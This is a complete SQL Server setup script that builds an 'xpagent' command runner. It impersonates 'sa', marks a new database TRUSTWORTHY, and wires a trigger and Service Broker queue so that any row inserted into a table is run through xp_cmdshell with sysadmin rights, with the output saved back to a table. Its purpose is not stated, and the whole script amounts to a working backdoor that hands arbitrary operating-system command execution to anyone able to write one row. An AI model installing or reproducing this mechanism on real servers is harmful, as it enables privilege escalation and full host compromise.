USE master;
GO
EXECUTE AS LOGIN = 'sa';
GO

-- ============================================================
-- 0. Create xpagent database (drop if already exists)
-- ============================================================
IF EXISTS (SELECT 1 FROM sys.databases WHERE name = N'xpagent')
BEGIN
    ALTER DATABASE xpagent SET SINGLE_USER WITH ROLLBACK IMMEDIATE;
    DROP DATABASE xpagent;
END
CREATE DATABASE xpagent;
ALTER DATABASE xpagent SET TRUSTWORTHY ON;
ALTER DATABASE xpagent SET ENABLE_BROKER WITH ROLLBACK IMMEDIATE;

SELECT
    name,
    is_trustworthy_on AS trustworthy_expect_1,
    is_broker_enabled AS broker_expect_1
FROM sys.databases WHERE name = N'xpagent';
GO

USE xpagent;
GO

-- ============================================================
-- 1. Tables
-- ============================================================
CREATE TABLE dbo.cmd (
    id         INT IDENTITY(1,1) PRIMARY KEY,
    cmd        NVARCHAR(MAX)  NOT NULL,
    status     TINYINT        NOT NULL DEFAULT 0,
               -- 0 pending | 1 running | 2 done | 3 failed
    created_at DATETIME2      NOT NULL DEFAULT SYSDATETIME()
);
CREATE TABLE dbo.out (
    cmd_id     INT            NOT NULL,
    seq        INT            NOT NULL,
    chunk      NVARCHAR(4000) NOT NULL,
    created_at DATETIME2      NOT NULL DEFAULT SYSDATETIME()
);
GO

-- ============================================================
-- 2. Worker proc (created before queue so PROCEDURE_NAME can resolve)
--    EXECUTE AS OWNER in TRUSTWORTHY DB with dbo=sa, sysadmin privileges, xp_cmdshell OK
-- ============================================================
CREATE PROCEDURE dbo.agent_worker AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @mt SYSNAME, @h UNIQUEIDENTIFIER, @body NVARCHAR(MAX);
    RECEIVE TOP(1)
        @mt   = message_type_name,
        @h    = conversation_handle,
        @body = CAST(message_body AS NVARCHAR(MAX))
    FROM dbo.agent_work;
    IF @h IS NULL RETURN;
    IF @mt IN (
        N'http://schemas.microsoft.com/SQL/ServiceBroker/EndDialog',
        N'http://schemas.microsoft.com/SQL/ServiceBroker/Error'
    ) BEGIN END CONVERSATION @h; RETURN; END

    DECLARE @sep INT           = CHARINDEX(N'|', @body);
    DECLARE @id  INT           = CAST(LEFT(@body, @sep - 1) AS INT);
    DECLARE @c   NVARCHAR(MAX) = SUBSTRING(@body, @sep + 1, LEN(@body));
    UPDATE dbo.cmd SET status = 1 WHERE id = @id;

    BEGIN TRY
        DECLARE @cv VARCHAR(8000) = CAST(@c AS VARCHAR(8000));
        DECLARE @o TABLE (line NVARCHAR(4000), idx INT IDENTITY(1,1));
        INSERT INTO @o (line) EXEC xp_cmdshell @cv;
        INSERT INTO dbo.out (cmd_id, seq, chunk)
            SELECT @id, idx, line FROM @o WHERE line IS NOT NULL;
        UPDATE dbo.cmd SET status = 2 WHERE id = @id;
    END TRY
    BEGIN CATCH
        BEGIN TRY
            INSERT INTO dbo.out (cmd_id, seq, chunk)
                VALUES (@id, 1, N'[agent:error] ' + ERROR_MESSAGE());
            UPDATE dbo.cmd SET status = 3 WHERE id = @id;
        END TRY
        BEGIN CATCH END CATCH
    END CATCH
    END CONVERSATION @h;
END;
GO

-- ============================================================
-- 3. Service Broker objects
-- ============================================================
CREATE MESSAGE TYPE [agent/msg] VALIDATION = NONE;
CREATE CONTRACT [agent/contract] ([agent/msg] SENT BY INITIATOR);
CREATE QUEUE dbo.agent_work WITH ACTIVATION (
    STATUS = ON,
    PROCEDURE_NAME = dbo.agent_worker,
    MAX_QUEUE_READERS = 1,
    EXECUTE AS OWNER
);
CREATE SERVICE [agent_svc] ON QUEUE dbo.agent_work ([agent/contract]);
GO

-- ============================================================
-- 4. Trigger: INSERT → SB self-dialog → activation
-- ============================================================
CREATE TRIGGER trg_agent_cmd ON dbo.cmd AFTER INSERT AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @h UNIQUEIDENTIFIER;
    DECLARE @id  INT           = (SELECT MIN(id)  FROM inserted);
    DECLARE @c   NVARCHAR(MAX) = (SELECT cmd FROM inserted WHERE id = @id);
    DECLARE @payload NVARCHAR(MAX) = CAST(@id AS NVARCHAR(20)) + N'|' + @c;
    BEGIN DIALOG CONVERSATION @h
        FROM SERVICE [agent_svc] TO SERVICE N'agent_svc', N'CURRENT DATABASE'
        ON CONTRACT [agent/contract] WITH ENCRYPTION = OFF;
    SEND ON CONVERSATION @h MESSAGE TYPE [agent/msg] (@payload);
END;
GO

-- ============================================================
-- 5. Verification + echo test
-- ============================================================
PRINT 'xpagent_init: objects created. Running echo test...';

DECLARE @test_id INT;
INSERT INTO dbo.cmd (cmd) VALUES (N'echo xpagent_ok');
SET @test_id = SCOPE_IDENTITY();
WAITFOR DELAY '00:00:05';

SELECT c.id, c.status AS status_expect_2, o.chunk AS chunk_expect_xpagent_ok
FROM dbo.cmd c JOIN dbo.out o ON o.cmd_id = c.id
WHERE c.id = @test_id;
GO
